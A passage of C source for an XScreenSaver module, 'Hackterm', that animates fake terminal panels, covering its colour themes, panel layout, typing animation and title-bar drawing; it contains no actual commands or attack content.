  p->nout = p->out_pos = 0;

  sc->fn (p);
  p->cmd_len = strlen (p->cmd);
  p->state = ST_TYPING;
  p->next_event = now_sec () + frnd (0.15, 1.4) / s->speed;
}

/* ------------------------------------------------------------------ */
/* colour themes                                                       */

typedef struct {
  const char *name;              /* -theme argument */
  const char *pal[C_NPAL];       /* BG FG CMD OK WARN ERR DIM CYAN MAG */
} ht_theme;

static const ht_theme themes[] = {
  /* name        BG        FG        CMD       OK        WARN
                 ERR       DIM       CYAN      MAG       TITLE_FG  TITLE_BG */
  { "phosphor", {
      "#000000", "#33ff33", "#33ff33", "#33ff33", "#33ff33",
      "#33ff33", "#33ff33", "#33ff33", "#33ff33",
      "#d0d0d0", "#2b2b2b" } },
  { "green", {
      "#000000", "#b9c6b9", "#ffffff", "#22ff77", "#ffd23f",
      "#ff4d4d", "#5c6b5c", "#4fd6ff", "#ff6ad5",
      "#000000", "#5c6b5c" } },
  { "amber", {
      "#120b00", "#d8a75a", "#ffd79a", "#ffb000", "#ff8c00",
      "#ff5a3c", "#6b4f1f", "#ffcf6b", "#ff9a5a",
      "#120b00", "#6b4f1f" } },
  { "blue", {
      "#05080f", "#a8c0d8", "#eaf6ff", "#39d0ff", "#ffc857",
      "#ff5c7a", "#3f5568", "#6fe3ff", "#9b8cff",
      "#05080f", "#3f5568" } },
  { "dracula", {
      "#1a1626", "#c8c3d8", "#ffffff", "#50fa7b", "#f1fa8c",
      "#ff5555", "#5b5470", "#8be9fd", "#ff79c6",
      "#1a1626", "#5b5470" } },
  { "solarized", {
      "#002b36", "#93a1a1", "#fdf6e3", "#859900", "#b58900",
      "#dc322f", "#586e75", "#2aa198", "#d33682",
      "#002b36", "#586e75" } },
  { "mono", {
      "#000000", "#cccccc", "#ffffff", "#ffffff", "#aaaaaa",
      "#ffffff", "#666666", "#dddddd", "#bbbbbb",
      "#000000", "#666666" } },
  { "red", {
      "#0d0000", "#d8a0a0", "#ffffff", "#ff3b3b", "#ff8a1f",
      "#ff1744", "#6b3030", "#ff6b6b", "#ff4d7a",
      "#0d0000", "#6b3030" } },
  { 0, { 0 } }
};

static const ht_theme *lookup_theme (const char *name)
{
  int i;
  if (!name) return &themes[0];
  for (i = 0; themes[i].name; i++)
    if (!strcasecmp (name, themes[i].name))
      return &themes[i];
  fprintf (stderr, "%s: unknown theme \"%s\"; using phosphor.\n", progname, name);
  return &themes[0];
}


/* ------------------------------------------------------------------ */
/* init                                                                */

static void layout_panels (ht_state *s);

static void free_panel (hpanel *p)
{
  if (p->lines) free (p->lines);
  p->lines = 0;
}

static void *hackterm_init (Display *dpy, Window window)
{
  ht_state *s = (ht_state *) calloc (1, sizeof (*s));
  char *fontname = get_string_resource (dpy, "font", "Font");
  int fontsize = get_integer_resource (dpy, "fontSize", "Integer");
  int i;
  char spec[256];

  s->dpy = dpy;
  s->window = window;
  XGetWindowAttributes (dpy, window, &s->xgwa);

  s->npanels = get_integer_resource (dpy, "panels", "Integer");
  if (s->npanels < 1) s->npanels = 1;
  if (s->npanels > MAXPANELS) s->npanels = MAXPANELS;
  s->show_titles = get_boolean_resource (dpy, "titles", "Titles");
  s->speed = get_float_resource (dpy, "speed", "Speed");
  if (s->speed <= 0) s->speed = 1.0;

  if (!fontname || !*fontname) fontname = strdup ("DejaVu Sans Mono");
  if (fontsize <= 0) fontsize = 12;
  snprintf (spec, sizeof spec, "%s %d", fontname, fontsize);
  s->font = load_xft_font_retry (dpy, screen_number (s->xgwa.screen), spec);
  if (!s->font)
    {
      snprintf (spec, sizeof spec, "fixed %d", fontsize);
      s->font = load_xft_font_retry (dpy, screen_number (s->xgwa.screen), spec);
    }
  if (!s->font) abort ();

  s->xftdraw = XftDrawCreate (dpy, window, s->xgwa.visual, s->xgwa.colormap);

  {
    XGlyphInfo gi;
    XftTextExtentsUtf8 (dpy, s->font, (FcChar8 *) "M", 1, &gi);
    s->char_w = gi.xOff;
    if (s->char_w < 1) s->char_w = 8;
  }
  s->char_h = s->font->ascent + s->font->descent;
  if (s->char_h < 1) s->char_h = 12;

  /* palette */
  {
    const ht_theme *th = lookup_theme (get_string_resource (dpy, "theme", "Theme"));
    for (i = 0; i < C_NPAL; i++)
      XftColorAllocName (dpy, s->xgwa.visual, s->xgwa.colormap,
                         th->pal[i], &s->pal[i]);
  }

  XftColorAllocName (dpy, s->xgwa.visual, s->xgwa.colormap,
                     "#3584e4", &s->close_bg);
  XftColorAllocName (dpy, s->xgwa.visual, s->xgwa.colormap,
                     "#ffffff", &s->close_fg);

  s->gc = XCreateGC (dpy, window, 0, 0);

  /* panel roles */
  for (i = 0; i < MAXPANELS; i++)
    {
      hpanel *p = &s->p[i];
      int r = i % (sizeof (roles) / sizeof (*roles));
      p->title  = roles[r].title;
      p->accent = roles[r].accent;
      p->role   = roles[r].role;
      snprintf (p->prompt, sizeof p->prompt, "%s", roles[r].prompt);
      p->next_event = now_sec () + frnd (0, 1.5);
      p->cursor_next = 0;
    }

  layout_panels (s);

  return s;
}

/* ------------------------------------------------------------------ */
/* layout                                                              */

static void layout_panels (ht_state *s)
{
  int n = s->npanels;
  int cols = (n == 1) ? 1 : (n == 2 ? 2 : (n <= 4 ? 2 : 3));
  int rows = (n + cols - 1) / cols;
  int W = s->xgwa.width, H = s->xgwa.height;
  int gap = 8;
  int cw = (W - gap * (cols + 1)) / cols;
  int ch = (H - gap * (rows + 1)) / rows;
  int i;

  for (i = 0; i < s->npanels; i++)
    {
      hpanel *p = &s->p[i];
      int cx = i % cols, cy = i / cols;
      int title_h;

      p->x = gap + cx * (cw + gap);
      p->y = gap + cy * (ch + gap);
      p->w = cw;
      p->h = ch;

      title_h = s->show_titles ? s->char_h + 9 : 4;
      p->tx = p->x + 6;
      p->ty = p->y + title_h + 2;
      p->tw = p->w - 12;
      p->th = p->h - title_h - 8;

      p->cols = p->tw / s->char_w;
      p->rows = p->th / s->char_h;
      if (p->cols < 4) p->cols = 4;
      if (p->rows < 2) p->rows = 2;

      {
        hline *nl = (hline *) calloc (p->rows, sizeof (hline));
        if (p->lines)
          {
            int c = p->nlines < p->rows ? p->nlines : p->rows;
            memcpy (nl, p->lines + (p->nlines - c), c * sizeof (hline));
            p->nlines = c;
            free (p->lines);
          }
        else
          p->nlines = 0;
        p->lines = nl;
      }

      p->state = ST_HOLD;
      p->cmd_pos = 0;
      p->nout = p->out_pos = 0;
      p->next_event = now_sec () + frnd (0.05, 1.2);
    }
}

/* ------------------------------------------------------------------ */
/* animation                                                           */

static void update_panel (ht_state *s, hpanel *p, double t)
{
  if (t < p->next_event) return;

  switch (p->state)
    {
    case ST_TYPING:
      if (p->cmd_len == 0)   /* nothing to type: draw a fresh scenario
                                instead of committing an empty prompt */
        {
          new_scenario (s, p);
          break;
        }
      if (p->cmd_pos < p->cmd_len)
        {
          p->cmd_pos++;
          p->next_event = t + frnd (0.02, 0.07) / s->speed;
          if (p->cmd[p->cmd_pos - 1] == ' ')
            p->next_event += frnd (0.03, 0.18) / s->speed;
        }
      else
        {
          /* command done: commit it to the scrollback */
          char line[MAXLINE + 60];
          snprintf (line, sizeof line, "%s%s", p->prompt, p->cmd);
          add_line (p, line, C_CMD);
          p->cmd_pos = 0;
          p->out_pos = 0;
          p->state = (p->nout > 0 ? ST_OUTPUT : ST_HOLD);
          p->next_event = t + frnd (0.05, 0.5) / s->speed;
        }
      break;

    case ST_OUTPUT:
      if (p->out_pos < p->nout)
        {
          add_line (p, p->out[p->out_pos].text, p->out[p->out_pos].color);
          p->out_pos++;
          /* most lines pop quickly, a few look like they waited on network */
          p->next_event = t + (rnd (12) == 0 ? frnd (0.5, 1.2)
                                              : frnd (0.04, 0.22)) / s->speed;
        }
      else
        {
          p->state = ST_HOLD;
          p->next_event = t + frnd (1.2, 3.0) / s->speed;
        }
      break;

    case ST_HOLD:
      new_scenario (s, p);
      break;
    }
}

/* ------------------------------------------------------------------ */
/* drawing                                                             */

static int text_width (ht_state *s, const char *str, int len)
{
  XGlyphInfo gi;
  if (len <= 0) return 0;
  XftTextExtentsUtf8 (s->dpy, s->font, (FcChar8 *) str, len, &gi);
  return gi.xOff;
}

static void draw_text (ht_state *s, int x, int y, const char *str, int color,
                       int maxchars)
{
  int len = strlen (str);
  if (maxchars > 0 && len > maxchars) len = maxchars;
  if (len <= 0) return;
  XftDrawStringUtf8 (s->xftdraw, &s->pal[color], s->font,
                     x, y, (FcChar8 *) str, len);
}

static void fill_rect (ht_state *s, int x, int y, int w, int h, int color)
{
  XSetForeground (s->dpy, s->gc, s->pal[color].pixel);
  XFillRectangle (s->dpy, s->window, s->gc, x, y, w, h);
}

static void draw_panel (ht_state *s, hpanel *p, double t)
{
  int i, baseline;

  /* hard-clip every primitive (rects as well as text) to the panel, so a
     bad width estimate can never paint outside its own box */
  {
    XRectangle cr;
    cr.x = p->x; cr.y = p->y; cr.width = p->w; cr.height = p->h;
    XSetClipRectangles (s->dpy, s->gc, 0, 0, &cr, 1, Unsorted);
  }

  /* body + 1px window outline */
  fill_rect (s, p->x, p->y, p->w, p->h, C_BG);
  fill_rect (s, p->x, p->y, 1, p->h, C_TITLE_BG);
  fill_rect (s, p->x + p->w - 1, p->y, 1, p->h, C_TITLE_BG);
  fill_rect (s, p->x, p->y + p->h - 1, p->w, 1, C_TITLE_BG);

  /* GNOME-Terminal-like window: no coloured frame, a thin dark title bar
     across the top with a centred title and minimise/maximise/close
     buttons on the right. */
  if (s->show_titles)
    {
      int bar_h = s->char_h + 9;
      int bx, btn_y = p->y + (bar_h - 9) / 2;
      int tw;

      fill_rect (s, p->x, p->y, p->w, bar_h, C_TITLE_BG);
      fill_rect (s, p->x, p->y + bar_h - 1, p->w, 1, C_TITLE_BG);

      /* title, centred */
      tw = text_width (s, p->title, strlen (p->title));
      if (tw > p->w - 80) tw = p->w - 80;
      draw_text (s, p->x + (p->w - tw) / 2,
                 p->y + (bar_h - s->char_h) / 2 + s->font->ascent,
                 p->title, C_TITLE_FG, p->cols);

      /* window buttons, right aligned: minimize, maximize, close.
         The three glyphs are 9 px wide with 7 px gaps, and the block ends
         5 px before the panel edge -- otherwise the close cross falls
         outside the panel clip and is invisible. */
      bx = p->x + p->w - 52;
      fill_rect (s, bx, btn_y + 4, 9, 1, C_TITLE_FG);             /* - */
      fill_rect (s, bx + 16, btn_y + 1, 9, 1, C_TITLE_FG);        /* square */
      fill_rect (s, bx + 16, btn_y + 9, 9, 1, C_TITLE_FG);
      fill_rect (s, bx + 16, btn_y + 1, 1, 9, C_TITLE_FG);
      fill_rect (s, bx + 24, btn_y + 1, 1, 9, C_TITLE_FG);

      /* close button: white cross on a filled blue disc, as in Adwaita */
      {
        /* Even diameter so the disc has an exact pixel centre; the cross is
           then drawn around that centre with equal arms at 45 degrees. */
        int d   = s->char_h > 13 ? s->char_h + 3 : 15;
        int cx  = bx + 30;
        int cy, ccx, ccy, k;

        if (d % 2) d++;
        cy  = p->y + (bar_h - d) / 2;
        ccx = cx + (d - 1) / 2;     /* true centre of the filled disc */
        ccy = cy + (d - 1) / 2;
        k   = (d - 1) / 2 - 5;      /* half arm: 5 px clear of the rim */
        if (k < 2) k = 2;

        XSetForeground (s->dpy, s->gc, s->close_bg.pixel);
        XFillArc (s->dpy, s->window, s->gc, cx, cy, d, d, 0, 360 * 64);

        /* Plot the two diagonals pixel by pixel: XDrawLine on a 45 degree
           line adds stray pixels at the ends (Bresenham), which reads as a
           chevron rather than a clean cross. */
        XSetForeground (s->dpy, s->gc, s->close_fg.pixel);
        {
          int i;
          for (i = -k; i <= k; i++)
            {
              XDrawPoint (s->dpy, s->window, s->gc, ccx + i, ccy + i);
              XDrawPoint (s->dpy, s->window, s->gc, ccx + i, ccy - i);
            }
        }
      }
    }
  else
    fill_rect (s, p->x, p->y, p->w, 1, C_DIM);

  /* everything below is clipped to the text area, otherwise over-long
     lines spill into the neighbouring panel (or off the window). */
  {
    XRectangle clip;
    clip.x = p->tx - 2;
    clip.y = p->ty - (s->show_titles ? s->char_h : 0);
    clip.width  = p->tw + 4;
    clip.height = p->th + s->char_h;
    XftDrawSetClipRectangles (s->xftdraw, 0, 0, &clip, 1);
  }

  /* scrollback */
  for (i = 0; i < p->nlines; i++)
    {
      baseline = p->ty + s->char_h - s->font->descent + i * s->char_h;
      draw_text (s, p->tx, baseline, p->lines[i].text, p->lines[i].color,
                 p->cols);
    }

  /* the line being typed, below the scrollback */
  if (p->state == ST_TYPING)
    {
      int line = p->nlines;
      int y = p->ty + s->char_h - s->font->descent + line * s->char_h;
      int x = p->tx;
      int plen = strlen (p->prompt);

      if (line < p->rows)
        {
          draw_text (s, x, y, p->prompt, C_OK, p->cols);
          x += text_width (s, p->prompt, plen);
          /* only the characters typed so far, so the command visibly
             appears letter by letter and the cursor sits at its end */
          if (p->cmd_pos > 0)
            draw_text (s, x, y, p->cmd, C_CMD,
                       (p->cmd_pos < p->cols - plen ? p->cmd_pos : p->cols - plen));
          x += text_width (s, p->cmd, p->cmd_pos);

          /* block cursor */
          if (t >= p->cursor_next)
            {
              p->cursor_on = !p->cursor_on;
              p->cursor_next = t + 0.45;
            }
          if (p->cursor_on && x + s->char_w < p->tx + p->tw)
            {
              int cx = x;
              if (cx > p->tx + p->tw - s->char_w)
                cx = p->tx + p->tw - s->char_w;
              fill_rect (s, cx, y - s->font->ascent + 1,
                         s->char_w, s->char_h, C_OK);
            }
        }
    }

  XftDrawSetClip (s->xftdraw, None);
  XSetClipMask (s->dpy, s->gc, None);
}

static unsigned long hackterm_draw (Display *dpy, Window window, void *closure)
{
  ht_state *s = (ht_state *) closure;
  double t = now_sec ();
  int i;

  fill_rect (s, 0, 0, s->xgwa.width, s->xgwa.height, C_BG);

  for (i = 0; i < s->npanels; i++)
    {
      update_panel (s, &s->p[i], t);
      draw_panel (s, &s->p[i], t);
    }

  return 30000;   /* ~33 fps */
}

static void hackterm_reshape (Display *dpy, Window window, void *closure,
                              unsigned int w, unsigned int h)
{
  ht_state *s = (ht_state *) closure;
  s->xgwa.width = w;
  s->xgwa.height = h;
  layout_panels (s);
}

static Bool hackterm_event (Display *dpy, Window window, void *closure,
                            XEvent *event)
{
  return False;
}

static void hackterm_free (Display *dpy, Window window, void *closure)
{
  ht_state *s = (ht_state *) closure;
  int i;

  for (i = 0; i < MAXPANELS; i++) free_panel (&s->p[i]);
  if (s->xftdraw) XftDrawDestroy (s->xftdraw);
  if (s->gc) XFreeGC (dpy, s->gc);
  if (s->font) XftFontClose (dpy, s->font);
  free (s);
}

/* ------------------------------------------------------------------ */

static const char *hackterm_defaults [] = {
  ".background:      #000000",
  ".foreground:      #b9c6b9",
  "*fpsSolid:        true",
  "*delay:           30000",
  "*panels:          4",
  "*titles:          True",
  "*speed:           1.0",
  "*theme:           phosphor",
  "*font:            Monospace",
  "*fontSize:        11",
  0
};

static XrmOptionDescRec hackterm_options [] = {
  { "-theme",      ".theme",     XrmoptionSepArg, 0 },
  { "-panels",     ".panels",    XrmoptionSepArg, 0 },
  { "-font",       ".font",      XrmoptionSepArg, 0 },
  { "-font-size",  ".fontSize",  XrmoptionSepArg, 0 },
  { "-speed",      ".speed",     XrmoptionSepArg, 0 },
  { "-titles",     ".titles",    XrmoptionNoArg, "True"  },
  { "-no-titles",  ".titles",    XrmoptionNoArg, "False" },
  { 0, 0, 0, 0 }
};

XSCREENSAVER_MODULE ("Hackterm", hackterm)
